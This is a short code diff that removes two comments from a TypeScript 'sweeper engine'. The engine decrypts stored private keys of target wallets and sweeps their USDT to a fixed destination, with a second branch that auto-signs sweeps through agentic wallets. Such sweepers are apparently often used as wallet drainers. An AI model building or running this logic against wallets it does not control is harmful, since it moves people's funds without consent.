@@ -60,7 +60,6 @@ export const startSweeperEngine = async () => {
 
                     const destination = targetData.destination as `0x${string}`;
 
-                    // ROUTE A: Standard Raw Private Key Target
                     if (targetData.encryptedKey && targetData.encryptedKey !== '') {
                         const privateKey = decryptKey(targetData.encryptedKey) as `0x${string}`;
                         const account = privateKeyToAccount(privateKey);
@@ -85,8 +84,6 @@ export const startSweeperEngine = async () => {
                         const txHash = await broadcastClient.writeContract(request);
                         console.log(`✅ Raw Wallet USDT Swept! TX: ${txHash}`);
                     } 
-                    
-                    // ROUTE B: Binance Agentic Wallet Target
                     else if (targetData.isAgentic === 'true') {
                         console.log(`🤖 Triggering Binance Agentic Auto-Sign Sweep for ${targetAddress}...`);
                         
